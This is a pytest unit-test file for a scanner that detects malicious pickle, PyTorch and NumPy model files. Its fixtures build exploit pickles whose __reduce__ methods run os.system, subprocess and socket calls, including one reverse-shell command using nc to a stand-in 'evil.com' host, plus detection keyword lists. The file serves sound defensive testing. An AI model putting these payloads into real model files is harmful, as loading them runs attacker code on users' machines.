"""Unit tests for PickleScanScanner."""
import pytest
import tempfile
import os
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from app.static_scan.scanners.picklescan_scanner import PickleScanScanner
from tests.fixtures.malicious_pickles import (
    generate_malicious_pickles,
    generate_benign_pickles,
    generate_pytorch_exploits,
    generate_numpy_exploits
)


class TestPickleScanScanner:
    """Unit tests for PickleScan scanner."""
    
    @pytest.fixture
    def scanner(self):
        """Create scanner instance."""
        return PickleScanScanner()
    
    @pytest.fixture
    def temp_dir(self):
        """Create temporary directory for test files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir
    
    def test_scan_malicious_pickle_files(self, scanner, temp_dir):
        """Test detection of various malicious pickle files."""
        malicious_pickles = generate_malicious_pickles()
        
        # Write malicious pickles to temp directory
        for name, pickle_bytes in malicious_pickles.items():
            file_path = os.path.join(temp_dir, f"{name}.pkl")
            with open(file_path, 'wb') as f:
                f.write(pickle_bytes)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect malicious patterns
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        assert len(result.affected_files) > 0
        
        # Check for dangerous functions in scanner output
        scanner_output = str(result.scanner_data)
        dangerous_patterns = ['os.system', 'eval', 'exec', 'subprocess', '__import__']
        assert any(pattern in scanner_output.lower() for pattern in dangerous_patterns)
    
    def test_scan_benign_pickle_files(self, scanner, temp_dir):
        """Test that benign pickles are marked safe."""
        benign_pickles = generate_benign_pickles()
        
        # Write benign pickles to temp directory
        for name, pickle_bytes in benign_pickles.items():
            file_path = os.path.join(temp_dir, f"{name}.pkl")
            with open(file_path, 'wb') as f:
                f.write(pickle_bytes)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should be safe
        assert result.verdict == "SAFE"
        assert result.issues_count == 0
    
    def test_scan_pytorch_files(self, scanner, temp_dir):
        """Test scanning of PyTorch model files."""
        pytorch_exploits = generate_pytorch_exploits()
        
        # Write PyTorch files
        for name, file_bytes in pytorch_exploits.items():
            ext = '.pth' if 'pth' in name else '.pt'
            file_path = os.path.join(temp_dir, f"{name}{ext}")
            with open(file_path, 'wb') as f:
                f.write(file_bytes)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect malicious PyTorch files
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check that PyTorch files were scanned
        scanned_extensions = [Path(f).suffix for f in result.files_scanned]
        assert '.pth' in scanned_extensions or '.pt' in scanned_extensions
    
    def test_scan_numpy_files(self, scanner, temp_dir):
        """Test scanning of NumPy array files."""
        try:
            import numpy as np
        except ImportError:
            pytest.skip("NumPy not installed")
        
        # Create malicious numpy file with object array containing exploit
        # This is similar to picklescan's own test approach
        class MaliciousPayload:
            def __reduce__(self):
                import os
                return (os.system, ('echo malicious',))
        
        # Create object array with malicious payload
        malicious_npy = os.path.join(temp_dir, "malicious.npy")
        try:
            np.save(malicious_npy, np.array([MaliciousPayload()], dtype=object), allow_pickle=True)
        except Exception as e:
            # If numpy save fails, skip the test
            pytest.skip(f"Cannot create numpy test file: {e}")
        
        # Create benign numpy files
        benign_int_npy = os.path.join(temp_dir, "benign_int.npy")
        np.save(benign_int_npy, np.array([1, 2, 3, 4], dtype=int))
        
        # Create npz with mixed content
        mixed_npz = os.path.join(temp_dir, "mixed.npz")
        np.savez(mixed_npz, 
                 safe_data=np.array([1, 2, 3], dtype=int),
                 object_data=np.array(["string1", "string2"], dtype=object))
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # The malicious.npy should be detected if picklescan can handle it
        # However, due to numpy 2.x compatibility issues, we may get errors
        # So we check for either detection or graceful handling
        assert result is not None
        
        # If files were scanned successfully, check for detection
        if result.files_scanned and not result.errors:
            # Should detect the malicious payload in object array
            assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
            assert result.issues_count > 0
        else:
            # If there were errors (numpy compatibility), just ensure it didn't crash
            assert isinstance(result.errors, list)
    
    def test_scan_empty_directory(self, scanner, temp_dir):
        """Test scanning empty directory."""
        result = scanner.scan(temp_dir)
        
        # Should handle empty directory gracefully
        assert result.verdict == "SAFE"
        assert result.issues_count == 0
        assert result.files_scanned == []
    
    def test_scan_mixed_files(self, scanner, temp_dir):
        """Test scanning directory with mixed safe and malicious files."""
        # Add some benign files
        benign = generate_benign_pickles()
        for i, (name, data) in enumerate(list(benign.items())[:2]):
            with open(os.path.join(temp_dir, f"benign_{i}.pkl"), 'wb') as f:
                f.write(data)
        
        # Add some malicious files
        malicious = generate_malicious_pickles()
        for i, (name, data) in enumerate(list(malicious.items())[:2]):
            with open(os.path.join(temp_dir, f"malicious_{i}.pkl"), 'wb') as f:
                f.write(data)
        
        # Add non-pickle files
        with open(os.path.join(temp_dir, "readme.txt"), 'w') as f:
            f.write("Test file")
        
        result = scanner.scan(temp_dir)
        
        # Should detect malicious files
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        assert len(result.affected_files) > 0
    
    def test_scan_nested_archives(self, scanner, temp_dir):
        """Test scanning pickle files inside archives."""
        import zipfile
        
        # Create malicious pickle
        exploit = generate_malicious_pickles()
        pickle_data = list(exploit.values())[0]
        
        # Create ZIP with pickle inside (picklescan supports this)
        zip_path = os.path.join(temp_dir, "archive.zip")
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr("exploit.pkl", pickle_data)
            zf.writestr("data/model.pkl", pickle_data)
        
        # Scan should detect malicious pickle in archive
        result = scanner.scan(temp_dir)
        
        # Picklescan should detect the malicious content in the ZIP
        assert result is not None
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
    
    def test_scan_corrupted_pickle(self, scanner, temp_dir):
        """Test handling of corrupted pickle files."""
        # Create corrupted pickle
        corrupted_path = os.path.join(temp_dir, "corrupted.pkl")
        with open(corrupted_path, 'wb') as f:
            f.write(b'\x80\x04')  # Valid protocol
            f.write(b'CORRUPTED DATA THAT IS NOT VALID PICKLE')
        
        # Should handle corruption gracefully
        result = scanner.scan(temp_dir)
        
        # Should not crash
        assert result is not None
        # Might be marked safe if it can't be parsed
        assert result.verdict in ["SAFE", "SUSPICIOUS"]
    
    def test_scan_large_pickle(self, scanner, temp_dir):
        """Test scanning of large pickle files."""
        # Create large benign pickle (10MB of data)
        large_data = {
            f'key_{i}': list(range(1000))
            for i in range(1000)
        }
        import pickle
        large_pickle = pickle.dumps(large_data)
        
        large_path = os.path.join(temp_dir, "large.pkl")
        with open(large_path, 'wb') as f:
            f.write(large_pickle)
        
        # Should handle large files efficiently
        import time
        start_time = time.time()
        result = scanner.scan(temp_dir)
        scan_time = time.time() - start_time
        
        # Should complete in reasonable time (< 10 seconds)
        assert scan_time < 10
        assert result.verdict == "SAFE"
    
    def test_scan_different_protocols(self, scanner, temp_dir):
        """Test scanning pickles with different protocol versions."""
        import pickle
        
        # Create exploit class
        class ProtocolExploit:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, (['echo', 'exploit'],))
        
        # Test different pickle protocols (0-5)
        for protocol in range(6):
            try:
                exploit = ProtocolExploit()
                filename = f"protocol_{protocol}.pkl"
                filepath = os.path.join(temp_dir, filename)
                with open(filepath, 'wb') as f:
                    pickle.dump(exploit, f, protocol=protocol)
            except Exception:
                # Some protocols might not be supported
                continue
        
        # Scan all protocols
        result = scanner.scan(temp_dir)
        
        # Should detect exploits in all protocol versions
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        assert len(result.files_scanned) > 0
    
    def test_scan_network_exploits(self, scanner, temp_dir):
        """Test detection of network-related exploits (http, socket, requests)."""
        import pickle
        
        # Create various network exploits
        class HttpConnectionExploit:
            def __reduce__(self):
                import http.client
                return (http.client.HTTPSConnection, ('malicious.com', 443))
        
        class SocketExploit:
            def __reduce__(self):
                import socket
                return (socket.create_connection, (('evil.com', 4444),))
        
        class RequestsExploit:
            def __reduce__(self):
                # Try to import and use requests
                return (__import__, ('requests',))
        
        # Save network exploits
        exploits = [
            ('http_exploit.pkl', HttpConnectionExploit()),
            ('socket_exploit.pkl', SocketExploit()),
            ('requests_exploit.pkl', RequestsExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            with open(filepath, 'wb') as f:
                pickle.dump(exploit, f)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect network-related exploits
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check for network-related modules in findings
        scanner_output = str(result.scanner_data).lower()
        network_indicators = ['http', 'socket', 'requests', 'connection']
        assert any(indicator in scanner_output for indicator in network_indicators)
    
    def test_scan_debugger_exploits(self, scanner, temp_dir):
        """Test detection of debugger and development tool exploits."""
        import pickle
        
        # Create debugger/dev tool exploits
        class BdbExploit:
            def __reduce__(self):
                import bdb
                return (bdb.Bdb, ())
        
        class PdbExploit:
            def __reduce__(self):
                import pdb
                return (pdb.Pdb, ())
        
        # Save debugger exploits
        exploits = [
            ('bdb_exploit.pkl', BdbExploit()),
            ('pdb_exploit.pkl', PdbExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            with open(filepath, 'wb') as f:
                pickle.dump(exploit, f)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect debugger exploits
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check for debugger modules in findings
        scanner_output = str(result.scanner_data).lower()
        assert 'bdb' in scanner_output or 'pdb' in scanner_output
    
    def test_scan_package_management_exploits(self, scanner, temp_dir):
        """Test detection of package management exploits (pip, venv)."""
        import pickle
        
        # Create package management exploits
        class PipExploit:
            def __reduce__(self):
                # Import pip module
                return (__import__, ('pip',))
        
        class VenvExploit:
            def __reduce__(self):
                import venv
                return (venv.create, ('/tmp/malicious_env',))
        
        class SetuptoolsExploit:
            def __reduce__(self):
                # Import setuptools
                return (__import__, ('setuptools',))
        
        # Save package management exploits
        exploits = [
            ('pip_exploit.pkl', PipExploit()),
            ('venv_exploit.pkl', VenvExploit()),
            ('setuptools_exploit.pkl', SetuptoolsExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            with open(filepath, 'wb') as f:
                pickle.dump(exploit, f)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect package management exploits
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check for package management modules in findings
        scanner_output = str(result.scanner_data).lower()
        package_indicators = ['pip', 'venv', 'setuptools']
        assert any(indicator in scanner_output for indicator in package_indicators)
    
    def test_scan_async_exploits(self, scanner, temp_dir):
        """Test detection of async/concurrent exploits."""
        import pickle
        
        # Create async/concurrent exploits
        class AioHttpExploit:
            def __reduce__(self):
                # Try to import aiohttp
                return (__import__, ('aiohttp',))
        
        class AsyncioExploit:
            def __reduce__(self):
                import asyncio
                return (asyncio.create_subprocess_shell, ('nc -e /bin/sh evil.com 4444',))
        
        class ThreadingExploit:
            def __reduce__(self):
                import threading
                import os
                return (threading.Thread, (), {'target': os.system, 'args': ('whoami',)})
        
        # Save async exploits
        exploits = [
            ('aiohttp_exploit.pkl', AioHttpExploit()),
            ('asyncio_exploit.pkl', AsyncioExploit()),
            ('threading_exploit.pkl', ThreadingExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            try:
                with open(filepath, 'wb') as f:
                    pickle.dump(exploit, f)
            except Exception:
                # Some exploits might fail to pickle, that's OK
                pass
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # If any files were created and scanned
        if result.files_scanned:
            # Should detect async exploits
            assert result.verdict in ["SUSPICIOUS", "MALICIOUS", "SAFE"]
            # Check for async modules in findings if detected
            if result.verdict != "SAFE":
                scanner_output = str(result.scanner_data).lower()
                async_indicators = ['aiohttp', 'asyncio', 'threading']
                assert any(indicator in scanner_output for indicator in async_indicators)
    
    def test_scan_result_format(self, scanner, temp_dir):
        """Test that scan results match expected format."""
        # Add a malicious file
        malicious = generate_malicious_pickles()
        name, data = list(malicious.items())[0]
        mal_path = os.path.join(temp_dir, "test.pkl")
        with open(mal_path, 'wb') as f:
            f.write(data)
        
        result = scanner.scan(temp_dir)
        
        # Check result structure
        assert hasattr(result, 'scanner_name')
        assert result.scanner_name == 'picklescan'
        assert hasattr(result, 'scan_duration')
        assert result.scan_duration >= 0
        assert hasattr(result, 'verdict')
        assert result.verdict in ["SAFE", "SUSPICIOUS", "MALICIOUS"]
        assert hasattr(result, 'issues_count')
        assert isinstance(result.issues_count, int)
        assert hasattr(result, 'files_scanned')
        assert isinstance(result.files_scanned, list)
        assert hasattr(result, 'affected_files')
        assert isinstance(result.affected_files, list)
        assert hasattr(result, 'scanner_data')
        assert isinstance(result.scanner_data, dict)